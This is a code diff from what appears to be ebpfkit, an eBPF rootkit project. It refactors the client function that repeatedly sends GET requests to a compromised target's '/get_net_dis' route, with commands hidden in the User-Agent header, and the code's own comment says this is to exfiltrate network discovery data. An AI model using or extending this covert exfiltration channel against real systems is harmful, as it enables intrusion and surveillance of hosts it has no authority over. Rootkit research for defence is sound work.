@@ -18,13 +18,13 @@ package network_discovery
 
 import (
 	"fmt"
-	"io/ioutil"
-	"net/http"
-	"net/http/httputil"
+	"os"
+	"os/signal"
 
 	"github.com/sirupsen/logrus"
 
 	"github.com/Gui774ume/ebpfkit/cmd/ebpfkit-client/run/utils"
+	"github.com/Gui774ume/ebpfkit/pkg/model"
 )
 
 type flow struct {
@@ -32,38 +32,17 @@ type flow struct {
 	daddr      string
 	sourcePort uint16
 	destPort   uint16
-	flowType   uint32
+	flowType   model.FlowType
 	udpCount   uint64
 	tcpCount   uint64
 }
 
-func (f flow) isEmpty() bool {
-	return f.saddr == "0.0.0.0" && f.daddr == "0.0.0.0" && f.sourcePort == 0 && f.destPort == 00 && f.flowType == 0 && f.udpCount == 0 && f.tcpCount == 0
+func (f flow) isPassive() bool {
+	return f.flowType == model.IngressFlow || f.flowType == model.EgressFlow
 }
 
-func sendRequest(method string, route string, userAgent string) []byte {
-	client := &http.Client{}
-	req, err := http.NewRequest(method, route, nil)
-	if err != nil {
-		logrus.Fatalln(err)
-	}
-
-	req.Header.Set("User-Agent", userAgent)
-
-	b, err := httputil.DumpRequest(req, true)
-	logrus.Debugf("\n%s", utils.CleanupHost(string(b)))
-
-	resp, err := client.Do(req)
-	if err != nil {
-		logrus.Fatalln(err)
-	}
-
-	defer resp.Body.Close()
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		logrus.Fatalln(err)
-	}
-	return body
+func (f flow) isEmpty() bool {
+	return f.saddr == "0.0.0.0" && f.daddr == "0.0.0.0" && f.sourcePort == 0 && f.destPort == 00 && f.flowType == 0 && f.udpCount == 0 && f.tcpCount == 0
 }
 
 func parseNetworkDiscoveryOutput(body []byte) ([]flow, bool) {
@@ -83,7 +62,7 @@ func parseNetworkDiscoveryOutput(body []byte) ([]flow, bool) {
 			daddr:      fmt.Sprintf("%d.%d.%d.%d", body[cursor+4], body[cursor+5], body[cursor+6], body[cursor+7]),
 			sourcePort: utils.ByteOrder.Uint16(body[cursor+8 : cursor+10]),
 			destPort:   utils.ByteOrder.Uint16(body[cursor+10 : cursor+12]),
-			flowType:   utils.ByteOrder.Uint32(body[cursor+12 : cursor+16]),
+			flowType:   model.FlowType(utils.ByteOrder.Uint32(body[cursor+12 : cursor+16])),
 			udpCount:   utils.ByteOrder.Uint64(body[cursor+16 : cursor+24]),
 			tcpCount:   utils.ByteOrder.Uint64(body[cursor+24 : cursor+32]),
 		}
@@ -98,7 +77,7 @@ func parseNetworkDiscoveryOutput(body []byte) ([]flow, bool) {
 }
 
 // SendGetNetworkDiscoveryRequest sends a request to exfiltrate network discovery data from the target system
-func SendGetNetworkDiscoveryRequest(target string) error {
+func SendGetNetworkDiscoveryRequest(target string, activeDiscovery bool, passiveDicovery bool) error {
 	var flows []flow
 	var newFlows []flow
 	var endOfFlows bool
@@ -107,7 +86,17 @@ func SendGetNetworkDiscoveryRequest(target string) error {
 	maxRequestsCount := 10
 	retryCounter := 0
 
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig, os.Interrupt, os.Kill)
+
+getFlows:
 	for !endOfFlows {
+		select {
+		case <-sig:
+			break getFlows
+		default:
+		}
+
 		_ = sendRequest("GET", target+"/get_net_dis", buildNetworkDiscoveryUserAgent(start))
 
 		// request file content
@@ -128,7 +117,7 @@ func SendGetNetworkDiscoveryRequest(target string) error {
 		fmt.Printf("%s:%d -> %s:%d (%d) UDP %dB TCP %dB\n", f.saddr, f.sourcePort, f.daddr, f.destPort, f.flowType, f.udpCount, f.tcpCount)
 	}
 
-	if err := generateGraph(flows); err != nil {
+	if err := generateGraph(flows, activeDiscovery, passiveDicovery); err != nil {
 		logrus.Fatalln(err)
 	}
 	return nil
